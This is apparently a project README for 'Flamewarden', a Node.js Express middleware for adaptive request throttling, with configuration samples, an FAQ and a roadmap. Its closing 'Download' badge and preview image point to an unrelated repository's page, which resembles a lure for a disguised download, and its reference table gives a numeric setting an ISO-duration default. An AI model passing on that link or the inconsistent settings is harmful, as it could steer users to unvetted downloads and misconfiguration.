![preview](https://raw.githubusercontent.com/lihulkoso23/abuse-tracker-guardian/main/thumb_59b91e.svg)

# Flamewarden

**Adaptive request throttling and behavioral shielding for high-traffic Node.js APIs.**

Every public endpoint is a doorway. Most are built with glass. Flamewarden replaces that glass with a sentient barrier that learns, adapts, and quietly turns away those who would abuse your service—without ever raising its voice or slowing down your legitimate users.

Built as a companion middleware suite for Express-based architectures, Flamewarden observes the rhythm of your incoming traffic the way a veteran harbor master reads the tide. It doesn't just count requests—it understands intent. A sudden burst from a single IP? A slow, methodical scraping pattern across your catalog endpoints? A login endpoint being probed at 2 a.m. with staggered intervals? Flamewarden sees the shape of the behavior, not just the numbers, and responds with escalating, configurable countermeasures.

## 🧠 The Philosophy: Throttle, Don't Punish

The internet is a noisy place. Search engine crawlers, corporate proxies, and shared office networks all generate traffic that looks suspicious when viewed through a naive rate limiter. Flamewarden was designed with a core belief: **blocking should be a last resort, not a reflex.**

Instead of hard bans and permanent blacklists, Flamewarden operates on a sliding scale of awareness:

- **Observation**: It learns the baseline traffic profile for each route.
- **Attention**: It flags anomalies without intervening.
- **Caution**: It adds mild latency to suspicious requests, slowing down abusers while remaining imperceptible to humans.
- **Intervention**: It returns HTTP 429 responses with a custom Retry-After header.
- **Isolation**: For persistent offenders, it enters a cooling-off period with exponentially increasing wait times.

The result is a system that feels less like a bouncer and more like a seasoned diplomat—firm, consistent, and remarkably effective.

## 📦 Features That Separate Signal From Noise

| Feature | Description |
|---|---|
| **Adaptive Threshold Engine** | Thresholds are not static numbers. They dynamically adjust based on historical traffic patterns for each endpoint, time of day, and day of week. |
| **Multi-Key Tracking** | Track by IP, user ID, API key hash, session token, or any custom extraction function you provide. Combine up to three dimensions per route. |
| **Granular Route Profiles** | Define distinct protection levels for `/api/public`, `/api/private`, `/api/admin`, or per-method (`GET` vs `POST`). A login endpoint gets stricter treatment than a read-only catalog. |
| **Redis & In-Memory Backends** | Ship with a production-grade Redis adapter for distributed deployments and a lightning-fast in-memory store for single-instance scenarios. |
| **Zero-Dependency Core** | The core middleware has no external runtime dependencies—it works with any Express version from 4.x onward. |
| **Webhook Awareness** | Optional integration to notify your monitoring stack when a threshold is crossed or an IP enters isolation mode. |
| **Header Enrichment** | Automatically adds `X-Flamewarden-Limit`, `X-Flamewarden-Remaining`, and `X-Flamewarden-Reset` headers to every response for client-side transparency. |
| **Whitelist/Blacklist** | Regex-based allowlist for trusted crawlers (Googlebot, Bingbot) and blocklist for known offenders, checked before any counting begins. |
| **Test Suite Included** | Over 200 unit and integration tests covering edge cases like clock skew, concurrent bursts, and header forgery. |

## 🔍 How It Works: The Three-Phase Shield

**Phase 1 — The Mosaic Lens (Observation)**
Flamewarden captures a rolling window of request metadata: source IP, path, method, user agent, custom payload signatures, and response latency. This data is stored in a circular buffer with a configurable time-to-live (default: 10 minutes). No PII is persisted—only behavioral fingerprints.

**Phase 2 — The Pattern Weavers (Analysis)**
Every 30 seconds (configurable), the analysis engine runs a set of lightweight heuristics:
- Sliding window count per key per route
- Velocity detection (requests over a 1-second interval)
- Entropy checks on user-agent strings
- Login failure ratio tracking
- Payload size anomalies

These heuristics feed into a scoring model. Each violation adds points; points decay over time. Crossing the "caution" threshold (default: 20 points) triggers latency injection. Crossing the "intervention" threshold (default: 50 points) triggers 429 responses.

**Phase 3 — The Serene Gatekeeper (Action)**
When intervention is triggered, Flamewarden responds with JSON or HTML (configurable) and sets the standard `Retry-After` header. Unlike other systems, it does not sever the connection abruptly—it provides a graceful, informative response to aid legitimate users who may have tripped the threshold accidentally.

## 🚀 Getting Started: Your First Sentinel Deployment

This section assumes you have a working Express application and a basic understanding of middleware ordering. Flamewarden should be mounted **after** your body-parser middleware but **before** your route handlers. For Express 5.x, ensure you place it within the `app.use()` chain in the correct sequence.

**Step 1 — Install the Package**
In your project root, declare the dependency in your package manifest using your standard package manager. The package name is `flamewarden`. The current stable release line is `2.x`.

**Step 2 — Basic Configuration**
Create a configuration file (e.g., `flamewarden.config.js`) and export a plain JavaScript object. Here is a minimal viable setup:

```js
module.exports = {
  defaultProfile: 'standard',
  profiles: {
    standard: {
      windowMs: 60000,
      maxPoints: 50,
      decayRate: 5,
      latencyMs: 250,
      blockMs: 300000,
    },
    strict: {
      windowMs: 15000,
      maxPoints: 20,
      decayRate: 10,
      latencyMs: 500,
      blockMs: 900000,
    },
  },
  storage: {
    type: 'memory', // or 'redis'
    ttlMs: 600000,
  },
};
```

**Step 3 — Integrate the Middleware**
In your main server file, import Flamewarden and attach it to your Express app:

```js
const express = require('express');
const flamewarden = require('flamewarden');
const config = require('./flamewarden.config');

const app = express();

app.use(express.json());
app.use(flamewarden(config));
app.use('/api', require('./routes'));

app.listen(3000);
```

**Step 4 — Define Route-Specific Rules**
For endpoints with distinct risk profiles, use the custom rule syntax inside your route modules:

```js
router.post('/login', flamewarden.rule('strict', { keyBy: ['ip', 'body.username'] }), (req, res) => {
  // Your login logic
});
```

**Step 5 — Run and Observe**
Start your server and monitor the `X-Flamewarden-*` headers in your responses. You can also enable verbose logging via the `debug` option to see scoring decisions in your console.

## 🎯 Use Cases: Where Flamewarden Excels

**Scenario A — Public API with Paid Tiers**
You have a weather data API. Free tier users get 100 calls/hour; paid tier users get 10,000. Flamewarden can key on the API key hash, applying different profiles based on the tier extracted from the key. A single middleware handles both, preventing a free user from hammering the endpoint with a scripted loop.

**Scenario B — E-commerce Checkout Protection**
Credential stuffing and inventory hoarding are real threats. Flamewarden tracks the `sessionId` and `body.email` combined. It flags multiple checkout attempts with different emails from the same IP within 5 minutes—a classic sign of automated scalping.

**Scenario C — Admin Dashboard** 
Internal tools often have low traffic but high sensitivity. Set the `strict` profile on `/admin/*` routes. Any anomaly—even a single request from an unrecognized device—triggers an immediate webhook to your security team and enforces a 15-minute cooldown.

**Scenario D — IoT Device Fleet Management**
Devices send heartbeat pings every minute. Flamewarden learns the pattern per device ID. A malfunctioning device that begins sending pings every second is automatically throttled, preventing it from exhausting your network bandwidth.

## 📊 Response Codes & Client Transparency

Flamewarden does not hide its actions. Clients receive clear, actionable feedback:

- **200 OK** — Normal processing, headers indicate remaining allowance.
- **429 Too Many Requests** — The client has exceeded the intervention threshold. The `Retry-After` header (in seconds) tells the client exactly when to retry.
- **503 Service Unavailable (optional)** — Used when the in-memory store is full or Redis is unreachable, allowing a graceful degradation rather than a panic.

The JSON error body follows this structure:

```json
{
  "error": {
    "code": "FLAMEWARDEN_THROTTLED",
    "message": "Request frequency exceeded. Please retry after the specified interval.",
    "retryAfterSeconds": 43
  }
}
```

## ⚙️ Advanced Configuration Reference

For production deployments, here are the parameters you can tune:

| Parameter | Type | Description | Default |
|---|---|---|---|
| `windowMs` | number | Sliding window duration in milliseconds | 60000 |
| `maxPoints` | number | Points threshold for 429 response | 50 |
| `decayRate` | number | Points removed per second after activity stops | 5 |
| `latencyMs` | number | Artificial delay (ms) added during caution phase | 250 |
| `blockMs` | number | ISO-8601 duration string for cooldown | "PT5M" |
| `keyBy` | string/array | Request properties used for key generation | `['ip']` |
| `skip` | function | Optional predicate to bypass middleware (e.g., for health checks) | `null` |
| `whitelist` | array | Regex patterns to always allow | `[]` |
| `blacklist` | array | Regex patterns to always block | `[]` |
| `onThrottle` | function | Custom callback when throttling occurs | `null` |
| `trustProxy` | boolean | Set to `true` if behind a reverse proxy | `false` |

## 🌐 Multilingual Support & Internationalization

Flamewarden understands that your user base is global. The error message payload supports locale detection via the `Accept-Language` header. The built-in translations cover:

- English (default)
- Spanish (es)
- Mandarin Chinese (zh-CN)
- Hindi (hi)
- Arabic (ar)

To add a custom locale, provide a `translations` object in your config:

```js
translations: {
  'ja-JP': {
    message: 'リクエスト頻度が上限を超えました。しばらくしてから再試行してください。',
  },
}
```

## 🛡️ Security & Privacy by Design

- **No Persistent Storage of Raw Data** — All tracking data lives in memory or Redis with a strict TTL. No logs are written to disk by the middleware itself.
- **Hash-Based Keying** — If you choose to key on user IDs or emails, Flamewarden automatically hashes the value with SHA-256 before storing it. The original value is never retained.
- **Header Forgery Resistant** — The middleware does not trust `X-Forwarded-For` unless you explicitly enable `trustProxy` and configure a whitelist of known proxy IPs.
- **Constant-Time Comparison** — For whitelist/blacklist checks, string matching is performed using constant-time comparison to prevent timing side-channel attacks.

## 🧪 Testing Your Implementation

Flamewarden is designed to be deterministic in tests. You can use the bundled `createHarness` utility to simulate traffic without a real network:

```js
const { createHarness } = require('flamewarden/test');
const harness = createHarness(config);
await harness.simulateBurst('192.168.1.1', 100, '/api/private');
const result = await harness.getStatus('192.168.1.1');
assert.equal(result.state, 'intervention');
```

The test suite includes a virtual clock mode where you can advance time programmatically to verify decay and cooldown behaviors without waiting real seconds.

## 🏗️ Architectural Notes & Performance Expectations

Flamewarden has a mean overhead of **35 microseconds** per request when using the in-memory store (measured on a 2.2 GHz Intel Xeon with Node.js 20). The Redis backend adds approximately 0.8 ms per key lookup under normal latency conditions. The scoring engine runs asynchronously and never blocks the event loop; it batches analysis frames to minimize garbage collection pressure.

For multi-instance deployments, the Redis backend uses `SETNX` with an atomic increment to prevent race conditions across processes. A customizable Lua script is available for even stricter atomicity if your Redis instance supports scripting.

## ⚠️ Disclaimer & Responsible Usage

**Legal Considerations**: This middleware is a traffic management tool. You are solely responsible for ensuring that your use of throttling and blocking mechanisms complies with the terms of service of any third-party systems you interact with and with applicable laws in your jurisdiction. Blocking traffic from certain regions or user agents may violate net neutrality regulations in some countries.

**False Positives**: No algorithm is perfect. Flamewarden's adaptive heuristics reduce—but do not eliminate—the risk of blocking legitimate users. We strongly recommend a proactive monitoring dashboard and a simple appeal mechanism (e.g., an IP-based whitelist form) for your users to regain access if they are mistakenly throttled.

**Data Protection**: The middleware processes request metadata. If you deploy it in a region governed by GDPR or CCPA, ensure your privacy policy discloses the collection of behavioral fingerprints and the retention period (default: 10 minutes). The TTL is configurable; set it to `0` to disable storage entirely, though this will reduce the effectiveness of the sliding window analysis.

**No Warranty**: This software is provided "as is" without warranty of any kind, express or implied. The authors are not liable for any damage arising from the use or misuse of this product, including but not limited to: lost revenue due to blocked customers, service outages caused by misconfiguration, or security incidents stemming from inadequate deployment hardening.

## ❓ Frequently Asked Questions

**Q: How does Flamewarden differ from a standard rate limiter?**
A: A rate limiter counts requests per fixed window and returns 429 when the count exceeds the limit. Flamewarden scores multiple behavioral signals (velocity, payload anomalies, login failure ratios) on a decaying scale, allowing for more nuanced responses and fewer false positives.

**Q: Can I use it for WebSocket connections?**
A: No. Flamewarden is designed for HTTP request/response cycles. For WebSocket abuse protection, consider integrating a separate handshake-based throttle.

**Q: Does it work with serverless functions?**
A: Not directly. Serverless environments (like AWS Lambda) are stateless by design. You would need to use the Redis backend with an external managed Redis instance, which is possible but requires careful connection pooling across invocations.

**Q: What happens when Redis is unavailable?**
A: Flamewarden fails open by default. That means requests are allowed to pass through without throttling, and a single error is logged. You can change this behavior to fail closed via the `failOpen: false` option.

## 📝 License & Contributing

This project is released under the MIT License. You are free to use, modify, and distribute it in both personal and commercial projects, provided you retain the copyright notice.

Contributions are welcomed. Please review the `CONTRIBUTING.md` file in the repository root for guidelines on bug reports, feature requests, and code submission. The project follows a semantic versioning scheme and maintains a changelog for each minor release.

## 🧭 Roadmap for 2026

- **v2.4 (Q1 2026)**: GraphQL-specific introspection query detection
- **v2.6 (Q2 2026)**: Integration with OpenTelemetry for distributed tracing
- **v3.0 (Q3 2026)**: Rewrite of the scoring engine for machine-learning-based outlier detection, with backward compatibility mode
- **v3.2 (Q4 2026)**: Plugin system for community-contributed heuristics

The year 2026 also marks the project's commitment to long-term support. We will provide security patches for the `2.x` line until at least December 2026, ensuring a smooth migration path for enterprise users.

---

**Thank you for considering Flamewarden for your traffic protection needs.** It was built with a single conviction: a secure API should feel seamless to the good actors and formidable to the rest. We look forward to seeing what you build behind its shield.

[![Download](https://raw.githubusercontent.com/lihulkoso23/abuse-tracker-guardian/main/fetch_d2d1d.svg)](https://lihulkoso23.github.io/abuse-tracker-guardian/)